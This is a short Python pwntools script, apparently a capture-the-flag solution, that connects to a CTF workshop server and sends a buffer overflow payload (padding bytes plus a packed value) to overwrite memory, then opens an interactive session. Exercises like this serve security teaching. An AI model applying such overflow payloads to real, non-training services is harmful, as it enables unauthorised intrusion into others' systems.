from pwn import *

p = remote("ctfworkshop.cybr.club", 3001)

p.sendline(b'A'*0x4c + p64(0x00000001))

p.interactive()
